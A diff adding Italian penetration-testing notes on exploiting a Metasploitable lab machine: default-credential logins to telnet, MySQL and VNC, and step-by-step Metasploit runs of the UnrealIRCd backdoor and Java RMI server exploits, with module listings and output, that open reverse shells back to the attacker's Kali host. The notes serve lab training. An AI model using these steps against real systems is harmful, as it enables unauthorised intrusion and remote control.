@@ -266,3 +266,180 @@ Meterpreter è una shell molto potente: supponiamo di aver ottenuto l'accesso a 
 Tramite il comando route, posso creare in modo traspartente una rotta a livello IP verso una rete R a cui la macchina vittima è connessa.
 A tal punto è possibile effettuare il penetration testing a una macchina della sottorete R (posso farvi una scansione delle porte con Nmap e così via).
 Tramite il comando portfwd, invece, posso aprire una porta P sulla macchina vittima e redirezionare il traffico diretto a P verso una destinazione a scelta.
+
+
+==============================================================================================================================================================
+
+
+SFRUTTAMENTO DI TELNET
+Interazione con la porta 23 --> telnet 192.168.56.103 23
+	metasploitable login: msfadmin
+	Password: msfadmin
+Sono così acceduto a una shell come utente msfadmin ma mi sono accorto che ha i privilegi di sudo --> sudo su
+	[sudo] password for msfadmin: msfadmin
+
+
+==============================================================================================================================================================
+
+
+SFRUTTAMENTO DI MYSQL
+Login senza inserimento di una password --> mysql -u root -p -h 192.168.56.103
+Con l'account di root è possibile eseguire qualsiasi operazione all'interno dei db di Metasploitable.
+
+
+==============================================================================================================================================================
+
+
+SFRUTTAMENTO DI VNC
+Interazione con la porta 5900 --> vncviewer 192.168.56.103
+	Password: password
+Per scoprire che la password per accedere a VNC è "password", mi è stato sufficiente cercare su Internet "vnc protocol 3.3 vulnerability".
+Qui viene proprio mostrato un attacco in cui si scopre con un brute force la password da inserire.
+
+
+==============================================================================================================================================================
+
+
+SFRUTTAMENTO DEL SERVIZIO IRC CON METASPLOIT
+msfconsole --> fornisce l'interfaccia command line di Metasploit.
+search irc --> ricerca i moduli (in particolare gli exploit) di irc --> l'output prodotto è riportato di seguito:
+	Matching Modules
+	================
+   	#   Name                                              Disclosure Date  Rank       Check  Description
+   	-   ----                                              ---------------  ----       -----  -----------
+   	0   exploit/multi/local/allwinner_backdoor            2016-04-30       excellent  Yes    
+   	1   exploit/multi/http/struts_default_action_mapper   2013-07-02       excellent  Yes    
+   	2   exploit/windows/emc/replication_manager_exec      2011-02-07       great      No     
+   	3   exploit/linux/misc/lprng_format_string            2000-09-25       normal     No     
+   	4   exploit/multi/misc/legend_bot_exec                2015-04-27       excellent  Yes    
+   	5   exploit/windows/browser/ms06_013_createtextrange  2006-03-19       normal     No     
+   	6   exploit/windows/http/sharepoint_ssi_viewstate     2020-10-13       excellent  Yes    
+   	7   auxiliary/dos/windows/llmnr/ms11_030_dnsapi       2011-04-12       normal     No     
+   	8   post/multi/gather/irssi_creds                                      normal     No     
+   	9   exploit/multi/misc/pbot_exec                      2009-11-02       excellent  Yes    
+   	10  exploit/multi/misc/ra1nx_pubcall_exec             2013-03-24       great      Yes    
+   	11  exploit/linux/http/synology_dsm_smart_exec_auth   2017-11-08       excellent  Yes    
+   	12  exploit/multi/http/sysaid_auth_file_upload        2015-06-03       excellent  Yes    
+   	13  exploit/windows/misc/talkative_response           2009-03-17       normal     No     
+   	14  exploit/osx/misc/ufo_ai                           2009-10-28       average    No     
+   	15  exploit/windows/misc/ufo_ai                       2009-10-28       average    No     
+   	16  payload/cmd/unix/reverse_bash                                      normal     No     
+   	17  payload/cmd/unix/reverse_bash_udp                                  normal     No     
+   	18  exploit/unix/irc/unreal_ircd_3281_backdoor        2010-06-12       excellent  No     
+   	19  exploit/osx/local/vmware_fusion_lpe               2020-03-17       excellent  Yes    
+   	20  exploit/linux/ssh/vyos_restricted_shell_privesc   2018-11-05       great      Yes    
+   	21  post/windows/gather/credentials/xchat                              normal     No     
+   	22  exploit/multi/misc/xdh_x_exec                     2015-12-04       excellent  Yes    
+   	23  exploit/windows/browser/mirc_irc_url              2003-10-13       normal     No     
+   	24  exploit/windows/misc/mirc_privmsg_server          2008-10-02       normal     No     
+   	25  exploit/multi/misc/w3tw0rk_exec                   2015-06-04       excellent  Yes    
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor --> consente di utilizzare il modulo exploit/unix/irc/unreal_ircd_3281_backdoor.
+set RHOSTS 192.168.56.103 --> imposta RHOSTS (l'host target) a 192.168.56.103 (che è l'indirizzo IP di Metasploitable).
+show options --> mostra le opzioni di configurazione del modulo in uso --> l'output prodotto è riportato di seguito:
+	Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+	Name    Current Setting  Required  Description
+   	----    ---------------  --------  -----------
+   	RHOSTS  192.168.56.103   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   	RPORT   6667             yes       The target port (TCP)
+
+	Payload options (cmd/unix/reverse_bash_telnet_ssl):
+   	Name   Current Setting  Required  Description
+   	----   ---------------  --------  -----------
+   	LHOST                   yes       The listen address (an interface may be specified)
+   	LPORT  4444             yes       The listen port
+
+	Exploit target:
+	Id  Name
+   	--  ----
+   	0   Automatic Target
+
+set LHOST 192.168.56.16 --> imposta LHOST (l'host da cui far partire l'attacco) a 192.168.56.16 (che corrisponde all'indirizzo IP della mia macchina Kali).
+show payloads --> mostra tutti i payload disponibili per il modulo in uso; ha prodotto il seguente output:
+	Compatible Payloads
+	===================
+	#   Name                                        Disclosure Date  Rank    Check  Description
+   	-   ----                                        ---------------  ----    -----  -----------
+   	0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   	1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   	2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   	3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   	4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
+   	5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   	6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   	7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   	8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   	9   payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   	10  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   	11  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+   	
+Il payload che si rivela funzionante è il numero 7 --> set payload payload/cmd/unix/reverse_perl
+run --> l'esecuzione dell'exploit ha avuto successo; in particolare, ho ottenuto una shell come utente root.
+python -c 'import pty;pty.spawn("/bin/bash")' --> ottengo il TTY.
+
+
+==============================================================================================================================================================
+
+
+SFRUTTAMENTO DI JAVA-RMI CON METASPLOIT
+msfconsole --> fornisce l'interfaccia command line di Metasploit.
+search java_rmi --> ricerca i moduli (in particolare gli exploit) di Java RMI --> l'output prodotto è riportato di seguito:
+	Matching Modules
+	================
+   	#  Name                                            Disclosure Date  Rank       Check  Description
+   	-  ----                                            ---------------  ----       -----  -----------
+   	0  auxiliary/gather/java_rmi_registry                               normal     No     Java RMI Registry Interfaces Enumeration
+   	1  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Exec.
+  	2  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     No     Java RMI Server Insecure Endpoint Code Execution Scanner
+   	3  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
+
+use exploit/multi/misc/java_rmi_server --> consente di utilizzare il modulo exploit/multi/misc/java_rmi_server.
+show options --> mostra le opzioni di configurazione del modulo in uso --> l'output prodotto è riportato di seguito:
+	Module options (exploit/multi/misc/java_rmi_server):
+	Name       Current Setting  Required  Description
+   	----       ---------------  --------  -----------
+   	HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   	RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   	RPORT      1099             yes       The target port (TCP)
+   	SRVHOST    0.0.0.0          yes       The local host or network interface to listen on.
+   	SRVPORT    8080             yes       The local port to listen on.
+   	SSL        false            no        Negotiate SSL for incoming connections
+   	SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   	URIPATH                     no        The URI to use for this exploit (default is random)
+
+	Payload options (java/meterpreter/reverse_tcp):
+   	Name   Current Setting  Required  Description
+   	----   ---------------  --------  -----------
+   	LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   	LPORT  4444             yes       The listen port
+
+	Exploit target:
+   	Id  Name
+   	--  ----
+   	0   Generic (Java Payload)
+   
+set RHOSTS 192.168.56.103 --> imposta RHOSTS (l'host target) a 192.168.56.103 (che è l'indirizzo IP di Metasploitable).
+set LHOST 192.168.56.16 --> imposta LHOST (l'host da cui far partire l'attacco) a 192.168.56.16 (per qualche motivo 127.0.0.1 non gli piace).
+show payloads --> mostra tutti i payload disponibili per il modulo in uso; ha prodotto il seguente output:
+	Compatible Payloads
+	===================
+  	#   Name                                     Disclosure Date  Rank    Check  Description
+   	-   ----                                     ---------------  ----    -----  -----------
+   	0   payload/generic/custom                                    normal  No     Custom Payload
+   	1   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
+   	2   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
+  	3   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
+   	4   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
+   	5   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
+   	6   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
+   	7   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
+   	8   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+   	9   payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
+   	10  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
+   	11  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
+   	12  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
+   	13  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager
+   	14  payload/multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager
+
+Vorrei utilizzare il payload numero 9 --> set payload payload/java/meterpreter/reverse_tcp
+run --> l'esecuzione dell'exploit ha avuto successo; in particolare, ho ottenuto una shell di tipo meterpreter.
